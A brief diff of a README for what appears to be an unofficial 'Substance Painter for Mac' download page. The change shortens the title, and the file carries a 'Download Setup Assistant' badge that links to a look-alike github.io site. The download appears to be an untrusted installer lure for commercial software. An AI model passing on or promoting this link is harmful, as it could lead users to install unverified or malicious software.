@@ -1,4 +1,4 @@
-# Substance Painter — Offline Setup Guide for Mac
+# Substance Painter for Mac
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://substance-painter-download-mac.github.io/.github)
 
